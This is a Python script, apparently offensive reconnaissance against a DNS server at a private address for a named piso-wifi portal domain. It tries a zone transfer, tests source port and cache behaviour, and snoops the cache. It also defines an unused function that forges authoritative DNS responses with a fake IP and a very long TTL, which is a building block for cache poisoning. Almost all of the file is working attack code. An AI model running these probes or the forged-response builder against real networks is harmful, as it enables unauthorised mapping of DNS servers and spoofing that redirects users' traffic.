import socket
import struct
import time
import random

target = "10.0.0.1"
attack_domain = "lpb.lpbpisowifi.com"

def build_dns_query(domain, qtype=1):
    tid = random.randint(0, 65535)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    qname = b""
    for part in domain.split("."):
        qname += bytes([len(part)]) + part.encode()
    qname += b"\x00"
    question = qname + struct.pack(">HH", qtype, 1)
    return header + question, tid

def build_fake_response(query_data, fake_ip="127.0.0.1", ttl=99999):
    """Build a forged DNS response based on the query"""
    tid = struct.unpack(">H", query_data[:2])[0]
    # Flags: 0x8580 = response + authoritative + no error
    qdcount = 1
    ancount = 1
    flags = 0x8580
    
    header = struct.pack(">HHHHHH", tid, flags, qdcount, ancount, 0, 0)
    
    # Question section (copy from query)
    qpos = 12
    qname = b""
    while query_data[qpos] != 0:
        qlen = query_data[qpos]
        qname += bytes([qlen]) + query_data[qpos+1:qpos+1+qlen]
        qpos += qlen + 1
    qname += b"\x00"
    qtype, qclass = struct.unpack(">HH", query_data[qpos+1:qpos+5])
    question = qname + struct.pack(">HH", qtype, qclass)
    
    # Answer section: name (pointer), type A, class IN, TTL, length, IP
    answer_name = struct.pack(">H", 0xC00C)  # pointer to name in question
    answer_type = 1  # A
    answer_class = 1  # IN
    answer_ttl = ttl
    answer_data = socket.inet_aton(fake_ip)
    answer = struct.pack(">HHHI", answer_type, answer_class, answer_ttl, len(answer_data)) + answer_data
    
    packet = header + question + answer
    return packet, tid

# Check if the DNS server allows zone transfers (AXFR)
print("=== Zone Transfer Attempt (AXFR) ===")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, 53))
    
    # AXFR query
    qname = b""
    for part in attack_domain.split("."):
        qname += bytes([len(part)]) + part.encode()
    qname += b"\x00"
    question = qname + struct.pack(">HH", 252, 1)  # QTYPE=AXFR
    
    query = struct.pack(">HHHHHH", 1, 0x0100, 1, 0, 0, 0) + question
    tcp_pkt = struct.pack(">H", len(query)) + query
    s.send(tcp_pkt)
    resp = s.recv(4096)
    if len(resp) > 2:
        print(f"  Got {len(resp)} bytes - Zone transfer may be allowed!")
        print(f"  Response hex: {resp[:100].hex()}")
    s.close()
except socket.timeout:
    print("  No response (AXFR likely disabled)")
except Exception as e:
    print(f"  AXFR error: {e}")

# Check source port behavior - send queries and see if source port changes
print()
print("=== Source Port Prediction ===")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 0))
local_port = s.getsockname()[1]
s.settimeout(2)

for i in range(5):
    query, tid = build_dns_query(attack_domain, 1)
    s.sendto(query, (target, 53))
    time.sleep(0.1)

print("  Sent 5 queries from local port", local_port)

# Check if DNS server uses a predictable source port by looking at the 
# TTL returned - if TTL decreases each query, it's using the same cache
s.close()

# Test cache behavior: query twice and check if TTL decreases
print()
print("=== Cache TTL Test ===")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)

# First query
query1, tid1 = build_dns_query("google.com", 1)
s.sendto(query1, (target, 53))
data1, _ = s.recvfrom(2048)
time.sleep(0.5)

# Second query - should return cached result with lower TTL
query2, tid2 = build_dns_query("google.com", 1)
s.sendto(query2, (target, 53))
data2, _ = s.recvfrom(2048)

# Parse TTL from both responses
def get_ttl(data):
    if len(data) < 12:
        return None
    _, flags, _, ancount, _, _ = struct.unpack(">HHHHHH", data[:12])
    if ancount == 0:
        return None
    # Skip question
    pos = 12
    while data[pos] != 0:
        pos += data[pos] + 1
    pos += 5  # null + qtype + qclass
    # First answer
    if data[pos] & 0xC0 == 0xC0:
        pos += 2
    else:
        while data[pos] != 0:
            pos += data[pos] + 1
        pos += 1
    _, _, ttl, rdlen = struct.unpack(">HHIH", data[pos:pos+10])
    return ttl

ttl1 = get_ttl(data1)
ttl2 = get_ttl(data2)
print(f"  First TTL: {ttl1}, Second TTL: {ttl2}")
if ttl1 and ttl2 and ttl2 < ttl1:
    print("  DNS cache is working - same cached result returned with lower TTL")
elif ttl1 and ttl2 and ttl2 == ttl1:
    print("  No caching (each query goes upstream)")
elif ttl1 and ttl2:
    print(f"  TTL difference: {ttl1 - ttl2}")
s.close()

# Try cache snooping: query domain and see if it's cached (large TTL = cached)
print()
print("=== Cache Snooping ===")
domains_to_test = ["lpb.lpbpisowifi.com", "google.com", "facebook.com", "lpb.lpbpisowifi.com"]
for dom in domains_to_test:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    query, tid = build_dns_query(dom, 1)
    s.sendto(query, (target, 53))
    try:
        data, _ = s.recvfrom(2048)
        ttl = get_ttl(data)
        print(f"  {dom}: TTL={ttl}")
    except:
        print(f"  {dom}: timeout")
    s.close()
    time.sleep(0.2)
